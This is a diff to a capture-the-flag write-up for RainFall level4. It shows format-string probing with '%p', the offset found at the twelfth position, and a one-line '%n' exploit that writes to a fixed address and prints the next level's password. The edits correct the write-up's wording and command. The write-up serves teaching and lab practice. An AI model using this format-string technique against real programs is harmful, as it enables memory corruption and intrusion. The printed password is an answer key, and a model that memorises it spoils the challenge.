@@ -108,12 +108,12 @@ level4@RainFall:~$ python -c 'print "AAAA" + " %p" * 15' > /tmp/pattern4
 level4@RainFall:~$ cat /tmp/pattern4 - | ./level4
 AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
 ```
-We found that the string <code>AAAA</code> resides in the twelfth position. With our understanding of the format string's location in the stack, our next step is to craft a string 16930116 characters in length, embedding the address of the variable (<code>0x08049810</code>) crucial for spawning the shell.
+We found that the string <code>AAAA</code> resides in the twelfth position. With our understanding of the format string's location in the stack, our next step is to craft a string 16930116 characters in length, embedding the address of the variable (<code>0x08049810</code>) crucial for printing the next password.
 
 ## exploit
 ``` shell
 level4@RainFall:~$ python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n"' > /tmp/flag4
-level4@RainFall:~$ cat /tmp/flag4 - | ./level4
+level4@RainFall:~$ cat /tmp/flag4 | ./level4
 [...]
                                        -1208015184
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
